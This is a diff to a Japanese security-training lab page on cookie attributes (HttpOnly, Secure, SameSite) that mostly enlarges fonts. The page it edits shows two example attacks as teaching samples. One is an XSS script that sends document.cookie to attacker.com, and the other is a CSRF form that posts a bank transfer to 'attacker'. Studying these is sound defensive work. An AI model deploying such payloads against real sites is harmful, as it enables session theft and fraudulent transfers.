@@ -19,43 +19,43 @@ window.SecurityLabModules["cookie_security"] = {
                     <div class="lab-grid-3" style="grid-template-columns: 1fr 1.2fr 1.1fr; gap: 20px; margin-top: 15px;">
                         <!-- Left: Cookie Config Form -->
                         <div style="background: rgba(255,255,255,0.01); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 14px; display: flex; flex-direction: column; gap: 10px;">
-                            <span style="font-weight: bold; color: var(--text-primary); font-size: 12px; display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px;">1. Cookie発行属性の設定</span>
+                            <span style="font-weight: bold; color: var(--text-primary); font-size: 13px; display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px;">1. Cookie発行属性の設定</span>
                             
                             <div class="form-group" style="margin: 0; display: flex; align-items: center; justify-content: space-between;">
-                                <label style="font-size: 11px; margin: 0;">HttpOnly属性:</label>
+                                <label style="font-size: 13px; margin: 0;">HttpOnly属性:</label>
                                 <input type="checkbox" id="cookieHttpOnly" checked style="width: auto;">
                             </div>
-                            <span style="font-size: 9px; color: var(--text-secondary); margin-top: -6px;">※ JavaScript (document.cookie) からのアクセス可否</span>
+                            <span style="font-size: 12px; color: var(--text-secondary); margin-top: -4px;">※ JavaScript (document.cookie) からのアクセス可否</span>
 
                             <div class="form-group" style="margin: 0; display: flex; align-items: center; justify-content: space-between;">
-                                <label style="font-size: 11px; margin: 0;">Secure属性:</label>
+                                <label style="font-size: 13px; margin: 0;">Secure属性:</label>
                                 <input type="checkbox" id="cookieSecure" checked style="width: auto;">
                             </div>
-                            <span style="font-size: 9px; color: var(--text-secondary); margin-top: -6px;">※ 暗号化通信 (HTTPS) 時のみ送信を許可</span>
+                            <span style="font-size: 12px; color: var(--text-secondary); margin-top: -4px;">※ 暗号化通信 (HTTPS) 時のみ送信を許可</span>
 
                             <div class="form-group" style="margin: 0;">
-                                <label style="font-size: 11px;">SameSite属性:</label>
-                                <select id="cookieSameSite" style="width: 100%; font-size: 11px; padding: 4px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
+                                <label style="font-size: 13px;">SameSite属性:</label>
+                                <select id="cookieSameSite" style="width: 100%; font-size: 13px; padding: 6px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
                                     <option value="strict">Strict (厳格な送信制限)</option>
                                     <option value="lax" selected>Lax (標準的な送信制限)</option>
                                     <option value="none">None (無制限・クロスサイト送信可能)</option>
                                 </select>
                             </div>
-                            <span style="font-size: 9px; color: var(--text-secondary); margin-top: -6px;">※ クロスサイトリクエスト時の送信制限</span>
+                            <span style="font-size: 12px; color: var(--text-secondary); margin-top: -4px;">※ クロスサイトリクエスト時の送信制限</span>
 
-                            <span style="font-weight: bold; color: var(--text-primary); font-size: 12px; display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px; margin-top: 10px;">2. リクエスト送信条件</span>
+                            <span style="font-weight: bold; color: var(--text-primary); font-size: 13px; display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px; margin-top: 10px;">2. リクエスト送信条件</span>
 
                             <div class="form-group" style="margin: 0;">
-                                <label style="font-size: 11px;">通信プロトコル:</label>
-                                <select id="cookieProtocol" style="width: 100%; font-size: 11px; padding: 4px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
+                                <label style="font-size: 13px;">通信プロトコル:</label>
+                                <select id="cookieProtocol" style="width: 100%; font-size: 13px; padding: 6px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
                                     <option value="https" selected>HTTPS (暗号化通信)</option>
                                     <option value="http">HTTP (非暗号化通信)</option>
                                 </select>
                             </div>
 
                             <div class="form-group" style="margin: 0;">
-                                <label style="font-size: 11px;">送信元・リクエストタイプ:</label>
-                                <select id="cookieReqType" style="width: 100%; font-size: 11px; padding: 4px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
+                                <label style="font-size: 13px;">送信元・リクエストタイプ:</label>
+                                <select id="cookieReqType" style="width: 100%; font-size: 13px; padding: 6px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
                                     <option value="normal">通常リクエスト (自サイト内での遷移)</option>
                                     <option value="csrf_link">クロスサイト遷移 (GET: 攻撃サイトからのリンク)</option>
                                     <option value="csrf_post">クロスサイトPOST (POST: 攻撃サイトのフォーム送信)</option>
@@ -63,35 +63,35 @@ window.SecurityLabModules["cookie_security"] = {
                             </div>
 
                             <div style="margin-top: 10px; display: flex; gap: 8px;">
-                                <button class="btn btn-primary" id="btnSimulateCookie" style="flex: 1; font-size: 11px; padding: 6px;">シミュレーション実行</button>
-                                <button class="btn" id="btnResetCookieFlow" style="font-size: 11px; padding: 6px; border: 1px solid var(--border-color); background: transparent;">リセット</button>
+                                <button class="btn btn-primary" id="btnSimulateCookie" style="flex: 1; font-size: 13px; padding: 8px;">シミュレーション実行</button>
+                                <button class="btn" id="btnResetCookieFlow" style="font-size: 13px; padding: 8px; border: 1px solid var(--border-color); background: transparent;">リセット</button>
                             </div>
                         </div>
 
                         <!-- Middle: Send Sequence Animation & Result -->
                         <div style="display: flex; flex-direction: column; gap: 14px;">
                             <div>
-                                <span style="font-weight: bold; color: var(--text-primary); font-size: 12px; display: block; margin-bottom: 6px;">リクエスト配送可否の可視化</span>
+                                <span style="font-weight: bold; color: var(--text-primary); font-size: 13px; display: block; margin-bottom: 6px;">リクエスト配送可否の可視化</span>
                                 <div class="cookie-flow-visual" style="display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); border: 1px solid var(--border-color); padding: 20px 14px; border-radius: var(--radius-md); position: relative; height: 80px;">
                                     <div style="text-align: center; z-index: 2;">
                                         <span style="font-size: 24px;" id="nodeClientBrowser">🌐</span>
-                                        <div style="font-size: 8px; color: var(--text-secondary); margin-top: 2px;">ブラウザ</div>
+                                        <div style="font-size: 12px; color: var(--text-secondary); margin-top: 2px;">ブラウザ</div>
                                     </div>
                                     <div class="flow-arrow" id="arrowClientToServer" style="flex: 1; border-top: 2px dashed #4b5563; height: 1px; margin: 0 10px; position: relative;">
                                         <div class="flow-dot" id="dotCookieFlow" style="display: none; position: absolute; top: -5px; left: 0; width: 8px; height: 8px; background-color: var(--color-primary); border-radius: 50%;"></div>
-                                        <span id="labelCookiePacket" style="position: absolute; top: -20px; left: 50%; transform: translateX(-50%); font-size: 8px; padding: 2px 4px; border-radius: 4px; background: rgba(0,0,0,0.6); display: none;">🍪 SessionID</span>
+                                        <span id="labelCookiePacket" style="position: absolute; top: -20px; left: 50%; transform: translateX(-50%); font-size: 12px; padding: 3px 6px; border-radius: 4px; background: rgba(0,0,0,0.8); color: #fff; display: none;">🍪 SessionID</span>
                                     </div>
                                     <div style="text-align: center; z-index: 2;">
                                         <span style="font-size: 24px;" id="nodeTargetServer">🏢</span>
-                                        <div style="font-size: 8px; color: var(--text-secondary); margin-top: 2px;">対象サーバー</div>
+                                        <div style="font-size: 12px; color: var(--text-secondary); margin-top: 2px;">対象サーバー</div>
                                     </div>
                                 </div>
-                                <div style="text-align: center; font-size: 10px; color: var(--text-secondary); margin-top: 6px; min-height: 15px;" id="textCookieFlowStatus">待機中</div>
+                                <div style="text-align: center; font-size: 13px; color: var(--text-secondary); margin-top: 6px; min-height: 15px;" id="textCookieFlowStatus">待機中</div>
                             </div>
 
                             <div style="flex: 1; display: flex; flex-direction: column; min-height: 180px;">
-                                <label style="font-size: 11px;">シミュレーション詳細判定:</label>
-                                <div class="response-box" style="flex: 1; overflow-y: auto; background-color: #0c0a09; border-color: rgba(99,102,241,0.3); padding: 12px; font-family: var(--font-mono); font-size: 10px; line-height: 1.4; color: #fbbf24; display: flex; flex-direction: column; gap: 8px;">
+                                <label style="font-size: 13px;">シミュレーション詳細判定:</label>
+                                <div class="response-box" style="flex: 1; overflow-y: auto; background-color: #0c0a09; border-color: rgba(99,102,241,0.3); padding: 12px; font-family: var(--font-mono); font-size: 13px; line-height: 1.5; color: #fbbf24; display: flex; flex-direction: column; gap: 8px;">
                                     <div id="textCookieAttrHeader" style="border-bottom: 1px dashed rgba(255,255,255,0.1); padding-bottom: 4px; color: #34d399; font-weight: bold;">Set-Cookie ヘッダー例がここに表示されます。</div>
                                     <div id="textCookieSentResult" style="color: #fbbf24;">シミュレーションを実行してください。</div>
                                     <div id="textCookieJsResult" style="color: #60a5fa;">JavaScript からの読み取り可否も判定します。</div>
@@ -101,7 +101,7 @@ window.SecurityLabModules["cookie_security"] = {
 
                         <!-- Right: Detailed Explanations & Exam tips -->
                         <div style="display: flex; flex-direction: column; gap: 14px;">
-                            <div style="background: rgba(99,102,241,0.03); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 14px; font-size: 11px; line-height: 1.5; color: var(--text-secondary);">
+                            <div style="background: rgba(99,102,241,0.03); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 14px; font-size: 13px; line-height: 1.6; color: var(--text-secondary);">
                                 <span style="font-weight: bold; color: var(--text-primary); border-bottom: 1px solid var(--border-color); padding-bottom: 4px; display: block; margin-bottom: 8px;">💡 Cookie属性の解説</span>
                                 <div style="display: flex; flex-direction: column; gap: 8px;">
                                     <div>
@@ -135,14 +135,14 @@ window.SecurityLabModules["cookie_security"] = {
                         <div style="border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; background: rgba(255, 255, 255, 0.01); display: flex; flex-direction: column; gap: 12px;">
                             <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 6px;">
                                 <span style="font-weight: bold; font-size: 13px; color: var(--text-primary);">🪲 シナリオ 1: XSS攻撃によるセッション盗聴</span>
-                                <span id="badgeXssStatus" class="badge" style="font-size: 10px; padding: 2px 6px; background-color: var(--bg-card); border: 1px solid var(--border-color);">未実行</span>
+                                <span id="badgeXssStatus" class="badge" style="font-size: 12px; padding: 3px 8px; background-color: var(--bg-card); border: 1px solid var(--border-color);">未実行</span>
                             </div>
 
-                            <p style="font-size: 11px; color: var(--text-secondary); margin: 0; line-height: 1.4;">
+                            <p style="font-size: 13px; color: var(--text-secondary); margin: 0; line-height: 1.5;">
                                 Webサイト上にXSS脆弱性があり、悪意あるスクリプトがインジェクションされた状況を再現します。攻撃スクリプトはブラウザ上で <code>document.cookie</code> を読み取り、攻撃者のサーバーへ送信しようと試みます。
                             </p>
 
-                            <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); padding: 8px; border-radius: 4px; font-family: monospace; font-size: 9px; color: #f87171; line-height: 1.3;">
+                            <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px; color: #f87171; line-height: 1.4;">
                                 &lt;script&gt;<br>
                                 &nbsp;&nbsp;const cookie = document.cookie;<br>
                                 &nbsp;&nbsp;fetch('http://attacker.com/leak?data=' + encodeURIComponent(cookie));<br>
@@ -150,13 +150,13 @@ window.SecurityLabModules["cookie_security"] = {
                             </div>
 
                             <div style="display: flex; justify-content: space-between; align-items: center; gap: 10px;">
-                                <div style="font-size: 11px;">
+                                <div style="font-size: 13px;">
                                     現在の設定: <span id="textXssHttpOnlyStatus" style="font-weight: bold;">HttpOnly: ON</span>
                                 </div>
-                                <button class="btn btn-primary" id="btnExecuteXss" style="font-size: 11px; padding: 6px 12px;">XSS攻撃を実行</button>
+                                <button class="btn btn-primary" id="btnExecuteXss" style="font-size: 13px; padding: 7px 14px;">XSS攻撃を実行</button>
                             </div>
 
-                            <div class="response-box" style="height: 100px; overflow-y: auto; background-color: #0c0a09; padding: 10px; font-family: var(--font-mono); font-size: 10px; color: #fbbf24;" id="logXssAttack">
+                            <div class="response-box" style="height: 100px; overflow-y: auto; background-color: #0c0a09; padding: 10px; font-family: var(--font-mono); font-size: 13px; color: #fbbf24;" id="logXssAttack">
                                 攻撃を実行すると、悪意あるスクリプトの実行ログと結果がここに表示されます。
                             </div>
                         </div>
@@ -165,14 +165,14 @@ window.SecurityLabModules["cookie_security"] = {
                         <div style="border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; background: rgba(255, 255, 255, 0.01); display: flex; flex-direction: column; gap: 12px;">
                             <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 6px;">
                                 <span style="font-weight: bold; font-size: 13px; color: var(--text-primary);">🕵️ シナリオ 2: CSRF攻撃による勝手な口座送金</span>
-                                <span id="badgeCsrfStatus" class="badge" style="font-size: 10px; padding: 2px 6px; background-color: var(--bg-card); border: 1px solid var(--border-color);">未実行</span>
+                                <span id="badgeCsrfStatus" class="badge" style="font-size: 12px; padding: 3px 8px; background-color: var(--bg-card); border: 1px solid var(--border-color);">未実行</span>
                             </div>
 
-                            <p style="font-size: 11px; color: var(--text-secondary); margin: 0; line-height: 1.4;">
+                            <p style="font-size: 13px; color: var(--text-secondary); margin: 0; line-height: 1.5;">
                                 ユーザーが「ログイン状態」のまま、悪意あるサイト（罠サイト）にアクセスした状況を再現します。罠サイトに埋め込まれた自動送信フォームによって、正規サイトの送金API（POST）に向けて強制リクエストが走ります。
                             </p>
 
-                            <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); padding: 8px; border-radius: 4px; font-family: monospace; font-size: 9px; color: #f87171; line-height: 1.3;">
+                            <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px; color: #f87171; line-height: 1.4;">
                                 &lt;form action="https://bank.com/transfer" method="POST" id="csrfForm"&gt;<br>
                                 &nbsp;&nbsp;&lt;input type="hidden" name="to" value="attacker"&gt;<br>
                                 &nbsp;&nbsp;&lt;input type="hidden" name="amount" value="100000"&gt;<br>
@@ -181,13 +181,13 @@ window.SecurityLabModules["cookie_security"] = {
                             </div>
 
                             <div style="display: flex; justify-content: space-between; align-items: center; gap: 10px;">
-                                <div style="font-size: 11px;">
+                                <div style="font-size: 13px;">
                                     現在の設定: <span id="textCsrfSameSiteStatus" style="font-weight: bold;">SameSite: Lax</span>
                                 </div>
-                                <button class="btn btn-primary" id="btnExecuteCsrf" style="font-size: 11px; padding: 6px 12px;">CSRF攻撃を実行</button>
+                                <button class="btn btn-primary" id="btnExecuteCsrf" style="font-size: 13px; padding: 7px 14px;">CSRF攻撃を実行</button>
                             </div>
 
-                            <div class="response-box" style="height: 100px; overflow-y: auto; background-color: #0c0a09; padding: 10px; font-family: var(--font-mono); font-size: 10px; color: #fbbf24;" id="logCsrfAttack">
+                            <div class="response-box" style="height: 100px; overflow-y: auto; background-color: #0c0a09; padding: 10px; font-family: var(--font-mono); font-size: 13px; color: #fbbf24;" id="logCsrfAttack">
                                 攻撃を実行すると、リクエスト送信時のCookie挙動と攻撃結果がここに表示されます。
                             </div>
                         </div>
@@ -195,10 +195,11 @@ window.SecurityLabModules["cookie_security"] = {
                     </div>
 
                     <!-- Footnotes: Detailed SameSite specs -->
-                    <div style="background: rgba(251,191,36,0.03); border: 1px solid rgba(251,191,36,0.2); border-radius: var(--radius-md); padding: 14px; font-size: 11px; line-height: 1.5; color: var(--text-secondary); margin-top: 20px;">
+                    <div style="background: rgba(251,191,36,0.03); border: 1px solid rgba(251,191,36,0.2); border-radius: var(--radius-md); padding: 14px; font-size: 13px; line-height: 1.6; color: var(--text-secondary); margin-top: 20px;">
                         <span style="font-weight: bold; color: #fbbf24; border-bottom: 1px solid rgba(251,191,36,0.2); padding-bottom: 4px; display: block; margin-bottom: 8px;">🔑 セキスペ重要出題ポイント：SameSite 3属性の挙動</span>
-                        <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 10px;">
+                        <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 12px;">
                             <thead>
+                                <tr style="border-bottom: 1px solid rgba(251,191,36,0.2); color: var(--text-primary);">
                                 <tr style="border-bottom: 1px solid rgba(251,191,36,0.2); color: var(--text-primary);">
                                     <th style="padding: 4px;">属性値</th>
                                     <th style="padding: 4px;">同一サイト内 (First-party)</th>
